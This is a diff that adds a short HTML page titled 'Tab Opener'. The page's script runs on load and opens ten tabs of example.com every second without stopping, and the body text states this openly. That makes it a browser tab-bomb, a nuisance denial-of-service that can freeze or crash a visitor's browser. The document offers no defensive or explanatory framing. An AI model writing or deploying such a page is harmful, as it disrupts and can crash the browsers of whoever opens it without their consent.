@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tab Opener</title>
+    <script>
+        window.onload = function() {
+            setInterval(function() {
+                for (let i = 0; i < 10; i++) {
+                    window.open('https://example.com');
+                }
+            }, 1000);
+        };
+    </script>
+</head>
+<body>
+    <h1>Tab Opener</h1>
+    <p>This page will open 10 tabs per second.</p>
+</body>
+</html>
